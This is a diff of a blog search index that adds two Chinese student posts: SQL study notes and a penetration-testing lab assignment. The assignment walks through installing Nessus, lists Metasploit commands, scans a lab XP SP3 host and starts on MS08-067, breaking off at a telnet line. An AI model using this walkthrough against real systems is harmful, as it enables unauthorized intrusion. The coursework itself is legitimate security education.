@@ -1,12 +1,278 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>sql语言</title>
+    <url>/2020/05/21/sql/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><ul>
+<li>创建数据库</li>
+<li>插入数据存储过程代码</li>
+</ul>
+<a id="more"></a>
+
+<h1 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h1><p>创建work1.sql文件</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`innodb`</span>(</span><br><span class="line">	<span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>,</span><br><span class="line">	<span class="string">`data`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`myisam`</span>(</span><br><span class="line">	<span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>,</span><br><span class="line">	<span class="string">`data`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">ENGINE</span>=myisam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> myinsert(a <span class="built_in">int</span>)</span><br><span class="line">	<span class="keyword">begin</span></span><br><span class="line">		<span class="keyword">declare</span> i <span class="built_in">int</span> <span class="keyword">default</span> <span class="number">1</span>;</span><br><span class="line">		repeat</span><br><span class="line">			<span class="keyword">insert</span> <span class="keyword">into</span> <span class="string">`innodb`</span>  <span class="keyword">VALUES</span>(i,i);</span><br><span class="line">			<span class="keyword">set</span> i=i+<span class="number">1</span>;</span><br><span class="line">		until i&gt;a end repeat;</span><br><span class="line">	<span class="keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 执行存储过程</span></span><br><span class="line"><span class="keyword">call</span> myinsert(<span class="number">10000</span>);</span><br><span class="line"><span class="comment">-- 删除myinsert函数</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">procedure</span> <span class="keyword">if</span> <span class="keyword">exists</span> myinsert;</span><br></pre></td></tr></table></figure>
+<p>可以编写sql文件，也可在命令列界面中分步运行</p>
+<p>运行之后需要刷新</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/images/image-20200316214043980.png"  alt="image-20200316214043980" style="zoom:50%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/1584365805(1).png"  alt="1584365805(1).png" style="zoom:35%;"></p>
+<h1 id="针对数据库的操作"><a href="#针对数据库的操作" class="headerlink" title="针对数据库的操作"></a>针对数据库的操作</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查看当前数据库</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建数据库</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> Management_System</span><br><span class="line"><span class="keyword">DEFAULT</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8mb4	</span><br><span class="line"><span class="keyword">DEFAULT</span> <span class="keyword">COLLATE</span> utf8mb4_unicode_ci;</span><br><span class="line"></span><br><span class="line"><span class="keyword">Use</span> Flight_Management_System;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 删除数据库</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> [ <span class="keyword">IF</span> <span class="keyword">EXISTS</span> ] &lt;数据库名&gt;;</span><br></pre></td></tr></table></figure>
+
+<h1 id="针对表的操作"><a href="#针对表的操作" class="headerlink" title="针对表的操作"></a>针对表的操作</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 向表中添加数据</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="string">`flight`</span> <span class="keyword">values</span>(<span class="string">'CA123'</span>,<span class="string">'TSN'</span>,<span class="string">'TAO'</span>,<span class="string">'CA'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 清空表</span></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> [表名];</span><br></pre></td></tr></table></figure>
+
+<h1 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h1><p>当输出的属性不为主键时,可能出现重复 </p>
+<h2 id="LIKE-NOT-LIKE匹配"><a href="#LIKE-NOT-LIKE匹配" class="headerlink" title="LIKE/NOT LIKE匹配"></a>LIKE/NOT LIKE匹配</h2><p>% 代表任意字符串</p>
+<p>_ 代表一个字符</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>	<span class="keyword">name</span></span><br><span class="line"><span class="keyword">FROM</span>	drinkers</span><br><span class="line"><span class="keyword">WHERE</span>	phone <span class="keyword">LIKE</span> <span class="string">'555%'</span>;</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查找所有李姓员工</span></span><br><span class="line"><span class="keyword">SELECT</span>	*</span><br><span class="line"><span class="keyword">FROM</span>	employee </span><br><span class="line"><span class="keyword">WHERE</span>	empname <span class="keyword">LIKE</span> <span class="string">'李%'</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="NULL空值"><a href="#NULL空值" class="headerlink" title="NULL空值"></a>NULL空值</h2><p>任意字符串(%)与空值比较的结果是<code>unknown</code>,不会返回unknown结果值</p>
+<p>true=1,false=0,unknown=1/2</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查找所有job非空的元组</span></span><br><span class="line"><span class="keyword">SELECT</span>	*</span><br><span class="line"><span class="keyword">FROM</span>	workson</span><br><span class="line"><span class="keyword">WHERE</span>	job <span class="keyword">LIKE</span> <span class="string">'%'</span>;	<span class="comment">-- 或者为 job IS NOT NULL</span></span><br></pre></td></tr></table></figure>
+<h2 id="ORDER-BY-输出排序"><a href="#ORDER-BY-输出排序" class="headerlink" title="ORDER BY 输出排序"></a>ORDER BY 输出排序</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">ORDER BY &lt;list of attributes&gt;</span><br><span class="line">ASC(升序,默认),DESC(降序)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>	enpname</span><br><span class="line"><span class="keyword">FROM</span>	employee</span><br><span class="line"><span class="keyword">WHERE</span>	deptno=<span class="string">'d2'</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> empno <span class="keyword">DESC</span>;	<span class="comment">-- 可以按照不输出的属性排序</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="多表查询"><a href="#多表查询" class="headerlink" title="多表查询"></a>多表查询</h2><h3 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 使用笛卡尔积连接两个表</span></span><br><span class="line"><span class="comment">-- 两个表中有同名属性,select其中一个时需要标明,不然会出现两列</span></span><br><span class="line"><span class="keyword">SELECT</span>	beer</span><br><span class="line"><span class="keyword">FROM</span>	frequents,likes </span><br><span class="line"><span class="keyword">WHERE</span>	bar=<span class="string">'Joe"s Bar'</span> <span class="keyword">AND</span>	</span><br><span class="line">		frequents.drinker = likes.drinker;</span><br><span class="line">		<span class="comment">-- 待查找的内容为'-&gt;"</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="natural-join"><a href="#natural-join" class="headerlink" title="natural join"></a>natural join</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>	*</span><br><span class="line"><span class="keyword">FROM</span>	employee natrual <span class="keyword">join</span> department</span><br><span class="line"><span class="keyword">WHERE</span>	location=<span class="string">'天津'</span>;</span><br><span class="line"><span class="comment">-- 相同的两列不重复出现</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 等价</span></span><br><span class="line"><span class="keyword">SELECT</span>	*</span><br><span class="line"><span class="keyword">FROM</span>	employee,department</span><br><span class="line"><span class="keyword">WHERE</span>	department.deptno=employee.deptno <span class="keyword">and</span></span><br><span class="line">		location=<span class="string">'天津'</span>;</span><br><span class="line"><span class="comment">-- 使用and/or连接多个查询条件</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="元组变量"><a href="#元组变量" class="headerlink" title="元组变量"></a>元组变量</h3><p>引入一个关系的两个或更多部分</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 返回制造商一致的啤酒对</span></span><br><span class="line"><span class="keyword">SELECT</span>	b1.name,b2.name</span><br><span class="line"><span class="keyword">FROM</span>	beers b1,beers b2</span><br><span class="line"><span class="keyword">WHERE</span>	b1.manf=b2.manf <span class="keyword">and</span></span><br><span class="line">		b1.name&lt;b2.name; <span class="comment">-- 避免冗余</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h2><h3 id="嵌套"><a href="#嵌套" class="headerlink" title="嵌套"></a>嵌套</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- find bars that serve Miller at the same price Joe charges for Bud</span></span><br><span class="line"><span class="keyword">SELECT</span>	bar</span><br><span class="line"><span class="keyword">FROM</span>	sells</span><br><span class="line"><span class="keyword">WHERE</span>	beer=<span class="string">'Miller'</span> <span class="keyword">and</span> price=</span><br><span class="line">			(<span class="keyword">SELECT</span>	price</span><br><span class="line">			<span class="keyword">FROM</span>	sells</span><br><span class="line">			<span class="keyword">WHERE</span>	bar=<span class="string">'Joe"s Bar'</span> <span class="keyword">and</span> beer=<span class="string">'Bud'</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="IN-NOT-IN操作"><a href="#IN-NOT-IN操作" class="headerlink" title="IN/NOT IN操作"></a>IN/NOT IN操作</h3><p>只能用于连接查询结果,而不能是 in+&lt;表&gt;</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>	*</span><br><span class="line"><span class="keyword">FROM</span>	Beers</span><br><span class="line"><span class="keyword">WHERE</span>	<span class="keyword">name</span> <span class="keyword">IN</span> </span><br><span class="line">			(<span class="keyword">SELECT</span> beer</span><br><span class="line">			<span class="keyword">FROM</span> likes</span><br><span class="line">			<span class="keyword">WHERE</span> drinker=<span class="string">'Fred'</span>); </span><br><span class="line">			<span class="comment">-- 当子查询只有一个查询结果,in可改为=</span></span><br><span class="line"><span class="comment">-- 或写成</span></span><br><span class="line"><span class="keyword">SELECT</span>	<span class="keyword">name</span>,manf</span><br><span class="line"><span class="keyword">FROM</span>	Beers,Likes</span><br><span class="line"><span class="keyword">WHERE</span>	drinker=<span class="string">'Fred'</span> <span class="keyword">and</span> beer=<span class="keyword">name</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="EXITS"><a href="#EXITS" class="headerlink" title="EXITS"></a>EXITS</h3><p>当且仅当关系非空时为真</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 不存在制造商一致的不同啤酒-&gt; 一个manf只有一个beer的beer</span></span><br><span class="line"><span class="keyword">SELECT</span>	<span class="keyword">name</span></span><br><span class="line"><span class="keyword">FROM</span>	beers b1</span><br><span class="line"><span class="keyword">WHERE</span>	<span class="keyword">NOT</span> <span class="keyword">EXISTS</span></span><br><span class="line">			(<span class="keyword">SELECT</span> *</span><br><span class="line">             <span class="keyword">FROM</span>	beers</span><br><span class="line">             <span class="keyword">WHERE</span>	manf = b1.manf <span class="keyword">and</span></span><br><span class="line">             		<span class="keyword">name</span> &lt;&gt; b1.name);</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查找部门中只有一名员工的员工姓名</span></span><br><span class="line"><span class="keyword">SELECT</span>	empname</span><br><span class="line"><span class="keyword">FROM</span>	empoyee e1</span><br><span class="line"><span class="keyword">WHERE</span>	<span class="keyword">not</span> <span class="keyword">exists</span></span><br><span class="line">		(<span class="keyword">SELECT</span>	*</span><br><span class="line">         <span class="keyword">FROM</span>	employee</span><br><span class="line">         <span class="keyword">WHERE</span>	deptno=e1.deptno <span class="keyword">and</span></span><br><span class="line">        		empname&lt;&gt;e1.empname);</span><br></pre></td></tr></table></figure>
+
+<h3 id="ANY-ALL"><a href="#ANY-ALL" class="headerlink" title="ANY/ALL"></a>ANY/ALL</h3><p>x=ANY (relation) 等于其中至少一个<br>x&gt;ANY (relation) 大于至少一个<br>relation中只有一个属性列<br>X&lt;&gt;ALL (relation) x不在relation内<br>x&gt;ALL (relation) x大于等于关系中的所有元组</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 找到售价最高的，注意是&gt;=</span></span><br><span class="line"><span class="keyword">SELECT</span>	beer</span><br><span class="line"><span class="keyword">FROM</span>	sells</span><br><span class="line"><span class="keyword">WHERE</span>	price&gt;=<span class="keyword">ALL</span>(<span class="keyword">SELECT</span> price <span class="keyword">FROM</span> sells);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 不是最低价格</span></span><br><span class="line"><span class="keyword">SELECT</span>	beer</span><br><span class="line"><span class="keyword">FROM</span>	sells</span><br><span class="line"><span class="keyword">WHERE</span>	price&gt;<span class="keyword">ANY</span>(<span class="keyword">SELECT</span> price <span class="keyword">FROM</span> sells);</span><br></pre></td></tr></table></figure>
+
+<h2 id="Union-Intersecion-Difference"><a href="#Union-Intersecion-Difference" class="headerlink" title="Union, Intersecion, Difference"></a>Union, Intersecion, Difference</h2><p>intersect：交集<br>union：并集<br>except：A-B</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 两个集合的交集,要求两个表具有相同的属性列</span></span><br><span class="line">(<span class="keyword">SELECT</span>	*	<span class="keyword">FROM</span>	likes) <span class="comment">-- likes(drinker,beer)</span></span><br><span class="line">	<span class="keyword">INTERSECT</span></span><br><span class="line">(<span class="keyword">SELECT</span>	drinker,beer</span><br><span class="line"><span class="keyword">FROM</span>	sells,frequents</span><br><span class="line"><span class="keyword">WHERE</span>	frequents.bar=sells.bar);</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Set-集合-Bag-包"><a href="#Set-集合-Bag-包" class="headerlink" title="Set(集合)/Bag(包)"></a>Set(集合)/Bag(包)</h2><p>普通的select-from-where是包-&gt;可重复<br>union\intersection\difference是集合-&gt;不可重复</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>	<span class="keyword">DISTINCT</span> price	<span class="comment">-- 强制转化为不可重复</span></span><br><span class="line"><span class="keyword">FROM</span>	sells;</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">(...) UNION ALL (...);	<span class="comment">-- 可重复</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- eg. empname有七条</span></span><br><span class="line"><span class="keyword">SELECT</span>	e1.empname</span><br><span class="line"><span class="keyword">FROM</span>	empname e1,empname e2; <span class="comment">-- 返回49条</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span>	<span class="keyword">DISTINCT</span> e1.empname</span><br><span class="line"><span class="keyword">FROM</span>	empname e1,empname e2; <span class="comment">-- 返回7条</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Aggregations聚合操作"><a href="#Aggregations聚合操作" class="headerlink" title="Aggregations聚合操作"></a>Aggregations聚合操作</h2><p>sum、avg、min、max、count、count(*)</p>
+<h3 id="AVG"><a href="#AVG" class="headerlink" title="AVG"></a>AVG</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>	<span class="keyword">AVG</span>(price)</span><br><span class="line"><span class="keyword">FROM</span>	sells;</span><br></pre></td></tr></table></figure>
+<h3 id="COUNT"><a href="#COUNT" class="headerlink" title="COUNT"></a>COUNT</h3><p>count忽略null，计算重复<br>count(*)不忽略null</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>	<span class="keyword">COUNT</span>(<span class="keyword">DISTINCT</span> price) <span class="comment">-- 有多少种不同的售价</span></span><br><span class="line"><span class="keyword">FROM</span>	sells</span><br><span class="line"><span class="keyword">WHERE</span>	beer=<span class="string">'Bud'</span>;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="GROUP-BY"><a href="#GROUP-BY" class="headerlink" title="GROUP BY"></a>GROUP BY</h3><p>分组运算在积运算和投影运算之后进行</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>	beer,<span class="keyword">AVG</span>(price)</span><br><span class="line"><span class="keyword">FROM</span>	sells</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span>	beer; <span class="comment">-- 获得每种啤酒的平均价格</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 每个员工做几个项目</span></span><br><span class="line"><span class="keyword">SELECT</span>	empno,<span class="keyword">count</span>(*)</span><br><span class="line"><span class="keyword">FROM</span>	workson</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span>	empno;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 每个项目由几名员工完成</span></span><br><span class="line"><span class="keyword">SELECT</span>	projectno,<span class="keyword">count</span>(*)</span><br><span class="line"><span class="keyword">FROM</span>	workson</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span>	projectno;</span><br></pre></td></tr></table></figure>
+
+<p>NULL单独作为一个分组</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1998.04.15后入职员工所参与项目的平均预算</span></span><br><span class="line"><span class="keyword">SELECT</span>	empno,<span class="keyword">avg</span>(budget)</span><br><span class="line"><span class="keyword">FROM</span>	workson,<span class="keyword">project</span></span><br><span class="line"><span class="keyword">WHERE</span>	workson.projectno=project.projectno</span><br><span class="line">		<span class="keyword">and</span> <span class="built_in">date</span>&gt;<span class="string">'1998-04-15'</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span>	empno;</span><br></pre></td></tr></table></figure>
+
+<h3 id="MIN"><a href="#MIN" class="headerlink" title="MIN"></a>MIN</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>	<span class="keyword">min</span>(budget)</span><br><span class="line"><span class="keyword">FROM</span>	<span class="keyword">project</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查找bud的最低价格,不能得到正确结果</span></span><br><span class="line"><span class="keyword">SELECT</span>	bar,<span class="keyword">min</span>(price)</span><br><span class="line"><span class="keyword">FROM</span>	sells</span><br><span class="line"><span class="keyword">WHERE</span>	beer=<span class="string">'Bud'</span>;</span><br><span class="line"><span class="comment">-- 应该写为</span></span><br><span class="line"><span class="keyword">SELECT</span>	bar</span><br><span class="line"><span class="keyword">FROM</span>	sells</span><br><span class="line"><span class="keyword">WHERE</span>	beer=<span class="string">'Bud'</span> <span class="keyword">and</span> </span><br><span class="line">		price&lt;=<span class="keyword">ALL</span>(<span class="keyword">SELECT</span>	price</span><br><span class="line">					<span class="keyword">FROM</span>	sells</span><br><span class="line">					<span class="keyword">WHERE</span>	beer=<span class="string">'Bud'</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="Having"><a href="#Having" class="headerlink" title="Having"></a>Having</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>	beer,<span class="keyword">AVG</span>(price)</span><br><span class="line"><span class="keyword">FROM</span>	sells</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span>	beer <span class="comment">-- having 添加group条件，至少在三家酒吧售卖或由B公司制造</span></span><br><span class="line"><span class="keyword">HAVING</span>	<span class="keyword">COUNT</span>(*)&gt;=<span class="number">3</span> <span class="keyword">OR</span> <span class="comment">--针对group by中的属性</span></span><br><span class="line">		beer	<span class="keyword">IN</span>	(<span class="keyword">SELECT</span> <span class="keyword">name</span>	</span><br><span class="line">		<span class="comment">-- 只有group by中的属性，才能以非聚合形式出现在having中</span></span><br><span class="line">					<span class="keyword">FROM</span>	beers</span><br><span class="line">					<span class="keyword">WHERE</span>	manf=<span class="string">'Busch'</span>);</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>数据库</category>
+      </categories>
+      <tags>
+        <tag>数据库</tag>
+        <tag>sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏洞测试作业八</title>
+    <url>/2020/05/21/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AB/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><div class="note primary no-icon">
+            <ul><li>kali linux</li><li>nessus</li><li>metasploit</li><li>ms08_067利用</li></ul>
+          </div>
+
+
+<pre><code>- kali linux
+- nessus
+- metasploit
+- ms08_067</code></pre><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>在KALI中安装NESSUS，对目标XP SP3主机进行扫描；根据扫描得到的漏洞结果利用metasploit框架（命令行模式）完成利用，对XP主机（关闭系统的安全防护措施）实施渗透攻击：</p>
+<p>（1）熟练掌握metasploit中的常见指令</p>
+<p>（2）攻击效果应该能获取XP主机的屏幕截图（屏幕截图个性化，比如用记事本打开输入个人学号等信息），并将截图作为实验报告的一部分提交</p>
+<p>（3）Armitage工具的渗透过程可以基于命令行的操作基础上自己实践</p>
+<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="0-Nessus安装"><a href="#0-Nessus安装" class="headerlink" title="(0) Nessus安装"></a>(0) Nessus安装</h3><h4 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h4><p>在<a href="https://www.tenable.com/downloads/nessus下载对应安装包，本人使用的是61为kali" target="_blank" rel="noopener">https://www.tenable.com/downloads/nessus下载对应安装包，本人使用的是61为kali</a> linux，下载的是<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/05/21/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AB/1811494刘旭萌_8.assets\image-20200517163539088.png"  alt="image-20200517163539088" style="zoom:80%;"></p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压安装包</span></span><br><span class="line">sudo dpkg -i Nessus-8.10.0-debian6_amd64.deb</span><br><span class="line"><span class="comment"># 启动服务</span></span><br><span class="line">/etc/init.d/nessusd start</span><br><span class="line"><span class="comment"># 查看服务</span></span><br><span class="line">sudo netstat -ntpl | grep nessus</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/05/21/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AB/.%5C1811494%E5%88%98%E6%97%AD%E8%90%8C_8.assets%5Cimage-20200519163250802.png"  alt="image-20200519163250802"></p>
+<p>表示安装成功</p>
+<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>在浏览器中输入<a href="https://localhost:8834/,点击```Advanced```,根据提示输入激活码,设置账户root,密码123456" target="_blank" rel="noopener">https://localhost:8834/,点击```Advanced```,根据提示输入激活码,设置账户root,密码123456</a></p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/05/21/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AB/1811494刘旭萌_8.assets\image-20200519164230839.png"  alt="image-20200519164230839" style="zoom:50%;"><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/05/21/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AB/1811494刘旭萌_8.assets\image-20200519164404837.png"  alt="image-20200519164404837" style="zoom: 33%;"></p>
+<p>使用浏览器更新插件易出现卡死情况,这时候需要用命令行手动更新</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo /opt/nessus/sbin/nessuscli update --plugins-only</span><br></pre></td></tr></table></figure>
+
+<p>重启服务</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo /etc/init.d/nessusd restart</span><br></pre></td></tr></table></figure>
+
+<p>安装成功</p>
+<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/05/21/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AB/1811494刘旭萌_8.assets\image-20200519215331129.png"  alt="image-20200519215331129" style="zoom:50%;">
+
+<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/05/21/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AB/1811494刘旭萌_8.assets\image-20200519215636880.png"  alt="image-20200519215636880" style="zoom: 50%;">
+
+<h3 id="1-metasploit常见指令"><a href="#1-metasploit常见指令" class="headerlink" title="(1) metasploit常见指令"></a>(1) metasploit常见指令</h3><table>
+<thead>
+<tr>
+<th>指令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>back</td>
+<td>跳出当前模块</td>
+</tr>
+<tr>
+<td>show exploits</td>
+<td>显示metasploit框架中所有课用的渗透攻击模块</td>
+</tr>
+<tr>
+<td></td>
+<td>主动型exploits能够直接连接并攻击特定主机</td>
+</tr>
+<tr>
+<td></td>
+<td>被动性exploits等待主机连接之后对其进行渗透攻击</td>
+</tr>
+<tr>
+<td>show auxiliary</td>
+<td>显示所有的辅助模块以及它们的用途<br>Metasploit中，辅助模块可以是扫描器、拒绝服务攻击工具、Fuzz测试器以及其它类型的工具</td>
+</tr>
+<tr>
+<td>show options</td>
+<td>参数options是保证框架哥哥模块正确运行所需要的各种设置，这个命令会列出所需参数</td>
+</tr>
+<tr>
+<td>show payloads</td>
+<td>攻击载荷是针对特定平台的一段攻击代码，他将通过网络传送到攻击目标进行执行</td>
+</tr>
+<tr>
+<td>use</td>
+<td>找到攻击模块或者payloads后，可以使用use命令加载模块</td>
+</tr>
+<tr>
+<td>show targets</td>
+<td>列出受到漏洞影响的目标系统的类型</td>
+</tr>
+<tr>
+<td>info</td>
+<td>info+模块名 给出此模块的详细信心、参数说明以及所有课用的目标操作系统</td>
+</tr>
+<tr>
+<td>check</td>
+<td>检测目标主机是否存在指定漏洞</td>
+</tr>
+<tr>
+<td>set</td>
+<td>针对某个参数进行设置（同时启动该参数）</td>
+</tr>
+<tr>
+<td>unset</td>
+<td>禁用相关参数</td>
+</tr>
+</tbody></table>
+<h3 id="2-扫描目标XP-SP3主机"><a href="#2-扫描目标XP-SP3主机" class="headerlink" title="(2) 扫描目标XP SP3主机"></a>(2) 扫描目标XP SP3主机</h3><h4 id="查看xp的ip地址"><a href="#查看xp的ip地址" class="headerlink" title="查看xp的ip地址"></a>查看xp的ip地址</h4><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/05/21/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AB/1811494刘旭萌_8.assets\image-20200519172427020.png"  alt="image-20200519172427020" style="zoom:67%;">
+
+<p>得到ip地址: 192.168.89.141</p>
+<h4 id="使用nessus扫描"><a href="#使用nessus扫描" class="headerlink" title="使用nessus扫描"></a>使用nessus扫描</h4><figure class="highlight plain"><figcaption><span>scan```->```advanced scan```</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image-20200519220049513](.\1811494刘旭萌_8.assets\image-20200519220049513.png)</span><br><span class="line"></span><br><span class="line">点击&#96;&#96;&#96;save&#96;&#96;&#96;&lt;img src&#x3D;&quot;.\1811494刘旭萌_8.assets\image-20200520172918075.png&quot; alt&#x3D;&quot;image-20200520172918075&quot; style&#x3D;&quot;zoom:67%;&quot; &#x2F;&gt;启动扫描</span><br><span class="line"></span><br><span class="line">下面利用漏洞ms08_067</span><br><span class="line"></span><br><span class="line">#### 使用metasploit</span><br><span class="line"></span><br><span class="line">##### &#x3D;&#x3D;xp关闭防火墙并打开445端口&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;sh</span><br><span class="line">telnet 192.168.89.141 